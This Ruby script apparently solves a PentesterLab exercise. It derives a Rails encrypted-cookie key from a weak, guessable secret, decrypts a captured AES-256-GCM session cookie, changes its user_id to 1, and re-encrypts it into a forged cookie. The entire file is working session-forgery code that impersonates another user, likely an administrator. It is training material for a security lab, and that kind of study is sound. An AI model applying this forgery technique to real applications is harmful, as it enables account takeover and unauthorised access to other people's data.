require 'uri'
require 'openssl'
require 'base64'
require 'json'


cookie=URI.decode "EIk%2BXNrUzAjaWjO9XI1s1y%2F9RqIrddWqSdEBNg9QwhtS%2BLIlTgP9mvUw5cP%2FJzkBqTOkBq3twodJQprVymQiezDjCk0xDgCnHNG7JuFdPjTVaZuIcd7zhkM%2FZDmJF%2B%2BB09vLjqqN6l03dm78sTCseRyATJYIGv0C4qo%3D--f4CNmTNQXWN4XJKy--f%2BSCqs6zAYAyA5LvQOHsVQ%3D%3D"

def secret
  secret = Digest::MD5.hexdigest("PentesterLab::Application")
  OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end
cipher = OpenSSL::Cipher.new("aes-256-gcm")

encrypted_data, iv, auth_tag = cookie.split("--").map { |v| ::Base64.strict_decode64(v) }

cipher.decrypt
cipher.key = secret
cipher.iv = iv
cipher.auth_tag = auth_tag
cipher.auth_data = ""

decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final
puts decrypted_data

data = JSON.parse decrypted_data
data['user_id']=1

puts data
cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

iv = cipher.random_iv
cipher.auth_data = ""

encrypted_data = cipher.update(data.to_json)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv }"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
puts URI.escape(blob, "=/+")

